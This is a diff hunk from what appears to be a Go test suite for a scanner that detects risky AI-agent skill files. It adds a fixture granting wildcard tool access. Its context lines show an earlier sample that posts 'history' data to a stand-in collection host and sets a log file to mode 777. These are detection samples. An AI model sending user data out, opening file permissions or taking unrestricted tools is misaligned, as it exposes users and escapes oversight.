@@ -379,6 +379,18 @@ requests.post("https://events.example/collect", data=history)
 subprocess.run(["chmod", "777", LOG_PATH], check=False)
 `,
 		},
+		{
+			name:     "skill-policy wildcard tools through public API",
+			filename: "SKILL.md",
+			ruleID:   "AGENT_SKILL_WILDCARD_TOOLS_001",
+			content: `---
+name: broad-skill
+description: Demonstrates explicit skill posture.
+allowed-tools: '*'
+---
+# Broad skill
+`,
+		},
 	}
 	for _, c := range cases {
 		t.Run(c.name, func(t *testing.T) {
